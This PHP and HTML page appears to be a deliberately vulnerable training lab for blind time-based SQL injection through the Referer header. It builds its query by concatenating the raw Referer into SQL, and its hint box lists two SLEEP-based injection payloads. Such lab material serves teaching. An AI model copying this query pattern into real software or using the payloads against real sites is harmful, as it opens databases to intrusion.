<?php
$server   = "localhost";
$username = "root"; // change for hosting
$password = "";     // change for hosting
$database = "KrazePlanetLabs_DB"; // ONE database

$conn = mysqli_connect($server, $username, $password, $database);

if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}


// Retrieve the Referer from the request if it is set
$referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';

// Construct the SQL query
$sql = "SELECT * FROM lab7 WHERE Referer = '" . $referer . "'";

// Execute the query
$result = $conn->query($sql);

// Display the results
if ($result->num_rows > 0) {
    while ($row = $result->fetch_assoc()) {
        echo "Username: " . $row['Username'] . "<br>";
    }
}

$conn->close();
?>
<!DOCTYPE html>
<html>
  <head>
    <title>Referer: Blind Time Based SQLI Lab</title>
  </head>
  <body>
    <h1>Referer: Blind Time Based SQLI Lab</h1>
      <button type="button" data-toggle="collapse" data-target="#hint">Hint</button>
      <div id="hint" class="collapse">
        <br>
        <pre>
Referer: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
Referer: ' OR SLEEP(10) OR '
</pre>
      </div>
      <br><br>

    <!-- Add Bootstrap CSS and JS files for the collapsible button to work -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
  </body>
</html>
